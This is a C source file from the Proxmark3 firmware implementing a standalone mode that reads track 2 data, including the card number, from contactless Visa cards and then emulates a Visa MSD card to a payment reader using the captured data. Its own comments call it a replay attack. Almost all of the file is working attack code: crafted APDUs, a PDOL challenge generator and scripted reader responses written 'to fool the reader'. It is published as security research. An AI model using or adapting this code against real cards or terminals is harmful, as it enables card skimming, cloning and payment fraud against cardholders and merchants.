//-----------------------------------------------------------------------------
// Copyright (C) Salvador Mendoza (salmg.net), 2020
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// Code for reading and emulating 14a technology aka MSDSal by Salvador Mendoza
//-----------------------------------------------------------------------------
#include "standalone.h"
#include "proxmark3_arm.h"
#include "appmain.h"
#include "fpgaloader.h"
#include "util.h"
#include "dbprint.h"
#include "ticks.h"
#include "string.h"
#include "BigBuf.h"
#include "iso14443a.h"
#include "protocols.h"
#include "cmd.h"
#include "commonutil.h"

void ModInfo(void) {
    DbpString("  HF - Reading VISA cards & Emulating a VISA MSD Transaction(ISO14443) - (Salvador Mendoza)");
}

/* This standalone implements two different modes: reading and emulating.
*
* The initial mode is reading with LED A as guide.
* In this mode, the Proxmark3 expects a Visa Card,
* and will act as card reader. Trying to find track 2.
*
* If the Proxmark3 found a track 2, it will change to emulation mode (LED C) automatically.
* During this mode the Proxmark3 will behave as card, emulating a Visa MSD transaction
* using the pre-saved track2 from the previous reading.
*
* It is possible to jump from mode to another by simply pressing the button.
* However, to jump from reading to emulation mode, the LED C as to be on, which
* means having a track 2 in memory.
*
* Keep pressing the button down will quit the standalone cycle.
*
* LEDs:
* LED A = in reading mode
* LED C = in emulation(a track 2 in memory) mode
* LED A + LED C = in reading mode, but you can jump back to emulation mode by pressing the button
* LED B = receiving/sending commands, activity
*
*
* Reading or emulating ISO-14443A technology is not limited to payment cards. This example
* was not only designed to make a replay attack, but to open new possibilities in the ISO-14443A
* technologies. Be brave enough to share your knowledge & inspire others. Salvador Mendoza.
*/

// Default GET PROCESSING
static uint8_t ppdol [255] = {0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00};

// Generate GET PROCESSING
static uint8_t treatPDOL(const uint8_t *apdu) {

    uint8_t plen = 7;

    // PDOL Format: 80 A8 00 00 + (PDOL Length+2) + 83 + PDOL Length + PDOL + 00
    for (uint8_t i = 1; i <= apdu[0]; i++) {          // Magic stuff, the generation order is important
        if (apdu[i] == 0x9F && apdu[i + 1] == 0x66) {   // Terminal Transaction Qualifiers
            ppdol[plen] = 0xF6;
            ppdol[plen + 1] = 0x20;
            ppdol[plen + 2] = 0xC0;
            ppdol[plen + 3] = 0x00;
            plen += 4;
            i += 2;
        } else if (apdu[i] == 0x9F && apdu[i + 1] == 0x1A) { // Terminal Country Code
            ppdol[plen] = 0x9F;
            ppdol[plen + 1] = 0x1A;
            plen += 2;
            i += 2;
        } else if (apdu[i] == 0x5F && apdu[i + 1] == 0x2A) { // Transaction Currency Code
            ppdol[plen] = 0x5F;
            ppdol[plen + 1] = 0x2A;
            plen += 2;
            i += 2;
        } else if (apdu[i] == 0x9A) {                   // Transaction Date
            ppdol[plen] = 0x9A;
            ppdol[plen + 1] = 0x9A;
            ppdol[plen + 2] = 0x9A;
            plen += 3;
            i += 1;
        } else if (apdu[i] == 0x95) {                   // Terminal Verification Results
            ppdol[plen] = 0x95;
            ppdol[plen + 1] = 0x95;
            ppdol[plen + 2] = 0x95;
            ppdol[plen + 3] = 0x95;
            ppdol[plen + 4] = 0x95;
            plen += 5;
            i += 1;
        } else if (apdu[i] == 0x9C) {                   // Transaction Type
            ppdol[plen] = 0x9C;
            plen += 1;
            i += 1;
        } else if (apdu[i] == 0x9F && apdu[i + 1] == 0x37) { // Unpredictable Number
            ppdol[plen] = 0x9F;
            ppdol[plen + 1] = 0x37;
            ppdol[plen + 2] = 0x9F;
            ppdol[plen + 3] = 0x37;
            plen += 4;
            i += 2;
        } else {                                        // To the others, add "0" to complete the format depending on its range
            uint8_t u = apdu[i + 2];
            while (u > 0) {
                ppdol[plen] = 0;
                plen += 1;
                u--;
            }
            i += 2;
        }
    }
    ppdol[4] = (plen + 2) - 7;                        // Length of PDOL + 2
    ppdol[6] = plen - 7;                              // Real length
    plen++;                                           // +1 because the last 0
    ppdol[plen] = 0x00;                               // Add the last 0 to the challenge
    return plen;
}

void RunMod(void) {
    StandAloneMode();
    DbpString("");
    DbpString(_YELLOW_(">>>") " Reading VISA cards & Emulating a VISA MSD Transaction a.k.a. MSDSal Started " _YELLOW_("<<<"));
    DbpString("");
    FpgaDownloadAndGo(FPGA_BITSTREAM_HF);

    // free eventually allocated BigBuf memory but keep Emulator Memory
    // also sets HIGH pointer of BigBuf enabling us to malloc w/o fiddling w the reserved emulator memory
    BigBuf_free_keep_EM();

    //For reading process
    iso14a_card_select_t card_a_info;

    uint8_t apdubuffer[MAX_FRAME_SIZE] = { 0x00 };

    //Specific for Visa cards: select ppse, select Visa AID, GET PROCESSING, SFI
    uint8_t ppse[20] = {
        0x00, 0xA4, 0x04, 0x00, 0x0e, 0x32, 0x50, 0x41,
        0x59, 0x2e, 0x53, 0x59, 0x53, 0x2e, 0x44, 0x44,
        0x46, 0x30, 0x31, 0x00
    };

    uint8_t visa[] = { 0x00, 0xA4, 0x04, 0x00, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x00 };


    /*
    uint8_t select_aid_hdr[5] = { 0x00, 0xA4, 0x04, 0x00, 0x00 };
    static const char* aid_list [] = {
        "A00000000305076010",  // VISA ELO Credit
        "A0000000031010",      // VISA Debit/Credit (Classic)
        "A000000003101001",    // VISA Credit
        "A000000003101002",    // VISA Debit
        "A0000000032010",      // VISA Electron
        "A0000000032020",      // VISA
        "A0000000033010",      // VISA Interlink
        "A0000000034010",      // VISA Specific
        "A0000000035010",      // VISA Specific
        "A0000000036010",      // Domestic Visa Cash Stored Value
        "A0000000036020",      // International Visa Cash Stored Value
        "A0000000038002",      // VISA Auth, VisaRemAuthen EMV-CAP (DPA)
        "A0000000038010",      // VISA Plus
        "A0000000039010",      // VISA Loyalty
        "A000000003999910",    // VISA Proprietary ATM
        "A000000098",          // Visa USA Debit Card
        "A0000000980848",      // Visa USA Debit Cardv
    };
    */

    uint8_t processing [8] = {0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00, 0x00};
    uint8_t sfi[5] = {0x00, 0xb2, 0x01, 0x0c, 0x00};

    uint8_t *apdus[4] = {ppse, visa, processing, sfi};
    uint8_t apduslen[4] = { sizeof(ppse), sizeof(visa), sizeof(processing), sizeof(sfi)};

    uint8_t pdol[50], plen = 8;

    bool existpdol;

    // - MSD token card format -
    //
    // Card number.............. 4412 3456 0578 1234
    // Expiration date.......... 17/11
    // Service code............. 201
    // Discretionary data....... 0000030000991
    // Pin verification value... 0000
    // CVV / iCvv...............     030
    // Trailing.................        000991

    //                     44   12   34   56   05   78   12   34   D 1711     2   01   00   00   03   00   00   99   1
    // char token[19] = {0x44,0x12,0x34,0x56,0x05,0x78,0x12,0x34,0xd1,0x71,0x12,0x01,0x00,0x00,0x03,0x00,0x00,0x99,0x1f};
    //
    // It is possible to initialize directly the emulation mode, having "token" with data and set "chktoken" = true ;)
    //
    char token[19] = {0x00};
    bool chktoken = false;

    // UID 4 bytes(could be 7 bytes if needed it)
    uint8_t flags = 0;
    FLAG_SET_UID_IN_DATA(flags, 4);
    // in case there is a read command received we shouldn't break
    uint8_t data[PM3_CMD_DATA_SIZE] = {0x00};

    uint8_t visauid[7] = {0xE9, 0x66, 0x5D, 0x20};
    memcpy(data, visauid, 4);

    // to initialize the emulation
    tag_response_info_t *responses;

    uint32_t cuid = 0;

    // command buffers
    uint8_t receivedCmd[MAX_FRAME_SIZE] = { 0x00 };
    uint8_t receivedCmdPar[MAX_PARITY_SIZE] = { 0x00 };


    // Allocate 512 bytes for the dynamic modulation, created when the reader queries for it
    // Such a response is less time critical, so we can prepare them on the fly
#define DYNAMIC_RESPONSE_BUFFER_SIZE 64
#define DYNAMIC_MODULATION_BUFFER_SIZE 512

    uint8_t dynamic_response_buffer[DYNAMIC_RESPONSE_BUFFER_SIZE] = {0};
    uint8_t dynamic_modulation_buffer[DYNAMIC_MODULATION_BUFFER_SIZE] = {0};
    // to know the transaction status
    uint8_t prevCmd = 0;

    // handler - command responses
    tag_response_info_t dynamic_response_info = {
        .response = dynamic_response_buffer,
        .response_n = 0,
        .modulation = dynamic_modulation_buffer,
        .modulation_n = 0
    };

// States for standalone
#define STATE_READ 0
#define STATE_EMU  1

    uint8_t state = STATE_READ;

    // Checking if the user wants to go directly to emulation mode using a hardcoded track 2
    if (chktoken == true && token[0] != 0x00) {
        state = STATE_EMU;
        DbpString("Initialized [ " _BLUE_("emulation mode") " ]");
        DbpString("Waiting for a card reader...");
    } else {
        DbpString("Initialized [ " _YELLOW_("reading mode") " ]");
        DbpString("Waiting for a VISA card...");
    }

    for (;;) {
        WDT_HIT();

        // exit from RunMod, send a usbcommand.
        if (data_available()) break;

        // Was our button held down or pressed?
        int button_pressed = BUTTON_HELD(1000);


        if (button_pressed  == BUTTON_HOLD) {
            break;
        } else if (button_pressed == BUTTON_SINGLE_CLICK) {
            // pressing one time change between reading & emulation
            if (state == STATE_READ) {
                if (chktoken == true && token[0] != 0x00) {
                    // only change to emulation if it saved a track 2 in memory
                    state = STATE_EMU;
                    DbpString("[ " _BLUE_("Emulation mode") " ]");
                } else
                    DbpString(_YELLOW_("Nothing in memory to emulate"));
            } else {
                state = STATE_READ;
                DbpString("[ " _YELLOW_("Reading mode") " ]");
            }
        }

        SpinDelay(500);

        if (state == STATE_READ) {
            LED_A_ON();
            if (chktoken) {
                LED_C_ON();
            }

            iso14443a_setup(FPGA_HF_ISO14443A_READER_MOD);

            if (iso14443a_select_card(NULL, &card_a_info, NULL, true, 0, false)) {

                for (uint8_t i = 0; i < 4; i++) {
                    chktoken = false;
                    LED_C_OFF();
                    LED_B_ON();

                    // add loop visa
                    // for (int i = 0; i < ARRAYLEN(AIDlist); i ++) {
//    hexstr_to_byte_array("a0da02631a440a44000000a012ad10a00e800200048108", sam_apdu, &sam_len);
                    uint8_t apdulen = iso14_apdu(apdus[i], (uint16_t) apduslen[i], false, apdubuffer, sizeof(apdubuffer), NULL);

                    if (apdulen > 0) {
                        DbpString("[ " _YELLOW_("Proxmark command") " ]");
                        Dbhexdump(apduslen[i], apdus[i], false);
                        DbpString("[ " _GREEN_("Card answer") " ]");
                        Dbhexdump(apdulen - 2, apdubuffer, false);
                        DbpString("-------------------------------");

                        for (uint8_t u = 0; u < apdulen; u++) {
                            if (i == 1) {

                                // check for PDOL
                                if (apdubuffer[u] == 0x9F && apdubuffer[u + 1] == 0x38) {

                                    for (uint8_t e = 0; e <= apdubuffer[u + 2]; e++) {
                                        pdol[e] =  apdubuffer[u + e + 2];
                                    }

                                    // generate a challenge
                                    plen = treatPDOL(pdol);
                                    apdus[2] = ppdol;
                                    apduslen[2] = plen;
                                    existpdol = true;
                                }
                            } else if (i == 3) {

                                // find track 2
                                if (apdubuffer[u] == 0x57 && apdubuffer[u + 1] == 0x13 && !chktoken) {
                                    chktoken = true;
                                    memcpy(&token, &apdubuffer[u + 2], 19);
                                    break;
                                }
                            }
                        }

                        if (i == 1) {
                            DbpString("[ "_GREEN_("Challenge generated") " ]");
                            Dbhexdump(plen, existpdol ? ppdol : processing, false);
                        }
                    } else {
                        DbpString(_RED_("Error reading the card"));
                    }
                    LED_B_OFF();
                }

                if (chktoken) {
                    DbpString("[ " _GREEN_("Track 2") " ]");
                    Dbhexdump(19, (uint8_t *)token, false);
                    DbpString("[ " _GREEN_("Card Number") " ]");
                    Dbhexdump(8, (uint8_t *)token, false);
                    DbpString("-------------------------------");
                    DbpString("");
                    DbpString("");
                    LED_C_ON();
                    state = STATE_EMU;
                    DbpString("Initialized [ " _BLUE_("emulation mode") " ]");
                    DbpString("Waiting for a card reader...");
                }
            }
            FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
            LED_D_OFF();

        } else if (state == STATE_EMU) {
            LED_A_OFF();
            LED_C_ON();

            // free eventually allocated BigBuf memory but keep Emulator Memory
            BigBuf_free_keep_EM();

            // tag type: 11 = ISO/IEC 14443-4 - javacard (JCOP)
            if (SimulateIso14443aInit(11, flags, data, NULL, 0, &responses, &cuid, NULL, NULL) == false) {
                BigBuf_free_keep_EM();
                reply_ng(CMD_HF_MIFARE_SIMULATE, PM3_EINIT, NULL, 0);
                DbpString(_RED_("Error initializing the emulation process!"));
                SpinDelay(500);
                state = STATE_READ;
                DbpString("Initialized [ "_YELLOW_("reading mode") " ]");
                DbpString("Waiting for a VISA card...");
                continue;
            }

            // We need to listen to the high-frequency, peak-detected path.
            iso14443a_setup(FPGA_HF_ISO14443A_TAGSIM_LISTEN);

            // command length
            int len = 0;
            // to check emulation status
            int retval = PM3_SUCCESS;
            bool odd_reply = true;

            clear_trace();
            set_tracing(true);

            for (;;) {
                LED_B_OFF();
                // clean receive command buffer
                if (GetIso14443aCommandFromReader(receivedCmd, sizeof(receivedCmd), receivedCmdPar, &len) == false) {
                    DbpString("Emulator stopped");
                    retval = PM3_EOPABORTED;
                    break;
                }

                tag_response_info_t *p_response = NULL;
                LED_B_ON();

                // dynamic_response_info will be in charge of responses
                dynamic_response_info.response_n = 0;

                //Dbprintf("receivedCmd: %02x\n", receivedCmd);
                // received a REQUEST
                if (receivedCmd[0] == ISO14443A_CMD_REQA && len == 1) {
                    odd_reply = !odd_reply;
                    if (odd_reply) {
                        p_response = &responses[RESP_INDEX_ATQA];
                    }

                    // received a HALT
                } else if (receivedCmd[0] == ISO14443A_CMD_HALT && len == 4) {
                    p_response = NULL;

                    // received a WAKEUP
                } else if (receivedCmd[0] == ISO14443A_CMD_WUPA && len == 1) {
                    prevCmd = 0;
                    p_response = &responses[RESP_INDEX_ATQA];

                    // received request for UID (cascade 1)
                } else if (receivedCmd[1] == 0x20 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT && len == 2) {
                    p_response = &responses[RESP_INDEX_UIDC1];

                    // received a SELECT (cascade 1)
                } else if (receivedCmd[1] == 0x70 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT && len == 9) {
                    p_response = &responses[RESP_INDEX_SAKC1];

                    // received a RATS request
                } else if (receivedCmd[0] == ISO14443A_CMD_RATS && len == 4) {
                    prevCmd = 0;
                    p_response = &responses[RESP_INDEX_ATS];

                } else {
                    if (g_dbglevel == DBG_DEBUG) {
                        DbpString("[ "_YELLOW_("Card reader command") " ]");
                        Dbhexdump(len, receivedCmd, false);
                    }

                    // emulate a Visa MSD (Magnetic stripe data) card
                    if (receivedCmd[0] == 0x02 || receivedCmd[0] == 0x03) {
                        dynamic_response_info.response[0] = receivedCmd[0];

                        // depending on card reader commands, the Proxmark will answer to fool the reader
                        // respond with PPSE
                        if (receivedCmd[2] == 0xA4 && receivedCmd[6] == 0x32 && prevCmd == 0) {
                            // need to adapt lengths..
                            uint8_t ppsea[39] = {
                                //        0x23 = 35,  skip two first bytes then the message - SW 2 is 35 = 0x23
                                0x6F, 0x23, 0x84, 0x0E, 0x32, 0x50, 0x41, 0x59,
                                0x2E, 0x53, 0x59, 0x53, 0x2E, 0x44, 0x44, 0x46,
                                0x30, 0x31, 0xA5, 0x11, 0xBF, 0x0C, 0x0E, 0x61,
                                0x0C, 0x4F,
                                //  len   aid0  aid1  aid2...
                                0x07, 0xA0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10,
                                0x87, 0x01, 0x01, 0x90, 0x00
                            };
                            memcpy(&dynamic_response_info.response[1], ppsea, sizeof(ppsea));
                            dynamic_response_info.response_n = sizeof(ppsea) + 1;
                            prevCmd++;

                            // respond Visa AID
                        } else if (receivedCmd[2] == 0xA4 && receivedCmd[10] == 0x03 && receivedCmd[11] == 0x10 && prevCmd == 1) {
                            uint8_t visauid_long[34] = {
                                //          0x1E = 30,  skip two first bytes then the message - SW 2 is 30 = 0x1E
                                0x6F, 0x1E, 0x84,
                                //      len   aid0  aid1  aid2....
                                0x07, 0xA0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10,
                                0xA5, 0x13, 0x50,
                                //      len      V     I     S     A           C     R    E      D     I     T
                                0x0B, 0x56, 0x49, 0x53, 0x41, 0x20, 0x43, 0x52, 0x45, 0x44, 0x49, 0x54,
                                0x9F, 0x38, 0x03, 0x9F, 0x66, 0x02,
                                0x90, 0x00
                            };
                            memcpy(&dynamic_response_info.response[1], visauid_long, sizeof(visauid_long));
                            dynamic_response_info.response_n = sizeof(visauid_long) + 1;
                            prevCmd++;

                            // GET PROCESSING
                        } else if (receivedCmd[1] == 0x80 && receivedCmd[2] == 0xA8 && receivedCmd[6] == 0x83  && prevCmd == 2) {
                            uint8_t processing_long[10] = {0x80, 0x06, 0x00, 0x80, 0x08, 0x01, 0x01, 0x00, 0x90, 0x00};
                            memcpy(&dynamic_response_info.response[1], processing_long, sizeof(processing_long));
                            dynamic_response_info.response_n = sizeof(processing_long) + 1;
                            prevCmd++;

                            // SFI
                        } else if (receivedCmd[1] == 0x00 && receivedCmd[2] == 0xB2  && prevCmd == 3) {
                            uint8_t card[25] = {
                                0x70, 0x15, 0x57, 0x13, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x90, 0x00
                            };
                            // add token array == Track 2 found before
                            memcpy(&card[4], token, sizeof(token));

                            memcpy(&dynamic_response_info.response[1], card, sizeof(card));
                            dynamic_response_info.response_n = sizeof(card) + 1;
                            prevCmd++;

                        } else {
                            uint8_t finished[2] = {0x6F, 0x00};
                            memcpy(&dynamic_response_info.response[1], finished, sizeof(finished));
                            dynamic_response_info.response_n = sizeof(finished) + 1;
                            if (prevCmd == 5) {
                                prevCmd = 0;
                            }
                        }
                    } else {
                        DbpString(_RED_("Received unknown command!"));
                        if (prevCmd < 4) {
                            memcpy(dynamic_response_info.response, receivedCmd, len);
                            dynamic_response_info.response_n = len;
                        } else {
                            dynamic_response_info.response_n = 0;
                        }
                    }
                }

                if (dynamic_response_info.response_n > 0) {
                    DbpString("[ " _GREEN_("Proxmark3 answer") " ]");
                    Dbhexdump(dynamic_response_info.response_n, dynamic_response_info.response, false);
                    DbpString("----");

                    // add CRC bytes, always used in ISO 14443A-4 compliant cards
                    AddCrc14A(dynamic_response_info.response, dynamic_response_info.response_n);
                    dynamic_response_info.response_n += 2;

                    if (prepare_tag_modulation(&dynamic_response_info, DYNAMIC_MODULATION_BUFFER_SIZE) == false) {
                        SpinDelay(500);
                        DbpString(_RED_("Error preparing Proxmark to answer!"));
                        continue;
                    }
                    p_response = &dynamic_response_info;
                }

                if (p_response != NULL) {
                    EmSendPrecompiledCmd(p_response);
                }
            }

            switch_off();
            set_tracing(false);
            BigBuf_free_keep_EM();
            reply_ng(CMD_HF_MIFARE_SIMULATE, retval, NULL, 0);
        }
    }
    DbpString("Exit standalone mode!");
    DbpString("");
    SpinErr(15, 200, 3);
    LEDsoff();
}
